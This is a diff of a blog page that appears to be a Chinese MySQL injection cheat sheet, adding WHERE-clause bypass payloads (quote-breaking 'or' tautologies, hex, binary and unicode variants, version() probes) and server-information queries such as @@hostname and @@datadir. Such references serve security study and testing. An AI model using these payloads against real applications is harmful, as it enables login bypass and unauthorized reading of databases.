@@ -208,7 +208,22 @@
 
       
         
-          <span itemprop="articleBody"></span>
+          <span itemprop="articleBody"><h2 id="Where后条件的各种转换姿势">Where后条件的各种转换姿势</h2><pre><code> <span class="string">' or "a"='</span>a<span class="string">'
+'</span> <span class="keyword">or</span> <span class="string">'a'</span>=n<span class="string">'a'</span>               <span class="comment">//unicode</span>
+<span class="string">' or '</span>a<span class="string">'=b'</span><span class="number">1100001</span><span class="string">'         //binary
+'</span> <span class="keyword">or</span> <span class="string">'a'</span>=x<span class="string">'61'</span>              <span class="comment">//16进制</span>
+<span class="string">' or 1=true #true=1, false=0
+'</span> <span class="keyword">or</span> <span class="number">1</span> #<span class="keyword">true</span>
+<span class="string">' or version()=5.5 #5.5.41-log
+'</span> <span class="keyword">or</span> round(pi(),<span class="number">1</span>)+<span class="keyword">true</span>+<span class="keyword">true</span>+<span class="number">0.4</span>=version() <span class="string">#3</span>.<span class="number">1</span>+<span class="number">1</span>+<span class="number">1</span>+<span class="number">0.4</span>
+<span class="keyword">select</span> * <span class="keyword">from</span> users <span class="keyword">where</span> <span class="string">'a'</span>=<span class="string">'b'</span>=<span class="string">'c'</span>
+<span class="keyword">select</span> * <span class="keyword">from</span> users <span class="keyword">where</span> (<span class="string">'a'</span>=<span class="string">'b'</span>)=<span class="string">'c'</span>
+<span class="keyword">select</span> * <span class="keyword">from</span> users <span class="keyword">where</span> (<span class="keyword">false</span>)=<span class="string">'c'</span>
+<span class="keyword">select</span> * <span class="keyword">from</span> users <span class="keyword">where</span> (<span class="number">0</span>)=<span class="string">'c'</span>
+<span class="keyword">select</span> * <span class="keyword">from</span> users <span class="keyword">where</span> (<span class="number">0</span>)=<span class="number">0</span>
+<span class="keyword">select</span> * <span class="keyword">from</span> users <span class="keyword">where</span> <span class="keyword">true</span>
+<span class="keyword">select</span> * <span class="keyword">from</span> users
+</code></pre></span>
         
       
     </div>
@@ -782,9 +797,15 @@ mysql&gt; <span class="function"><span class="keyword">select</span> <span class
 schema()
 mysql&gt; <span class="function"><span class="keyword">select</span> <span class="title">database</span>(<span class="params"></span>)</span>;<span class="comment">//显示mysql</span>
 <span class="keyword">select</span> schema_name <span class="keyword">from</span> information_schema.schemata;<span class="comment">//显示所有数据库</span>
-</code></pre><p>hostname</p>
-<pre><code>@<span class="variable">@hostname</span>
+</code></pre><h2 id="hostname">hostname</h2><pre><code>@<span class="variable">@hostname</span>
 mysql&gt; select <span class="variable">@@hostname</span>;
+</code></pre><h2 id="datadir">datadir</h2><pre><code>@<span class="variable">@datadir</span>
+mysql&gt; select <span class="variable">@@datadir</span>;
+<span class="comment">//data绝对路径</span>
+</code></pre><h2 id="current_timestamp">current_timestamp</h2><pre><code>current_timestamp
+mysql&gt; <span class="keyword">select</span> current_timestamp;<span class="comment">//当前时间</span>
+</code></pre><h2 id="uuid()">uuid()</h2><pre><code>uuid()
+mysql&gt; <span class="function"><span class="keyword">select</span> <span class="title">uuid</span>(<span class="params"></span>)</span>;
 </code></pre><h2 id="函数"><h1>函数</h1></h2><h2 id="length">length</h2><pre><code><span class="built_in">length</span>()
 mysql&gt; <span class="keyword">select</span> <span class="built_in">length</span>(<span class="string">"abc"</span>);<span class="comment">//字符串长度</span>
 </code></pre><h2 id="mid">mid</h2><pre><code>mid()
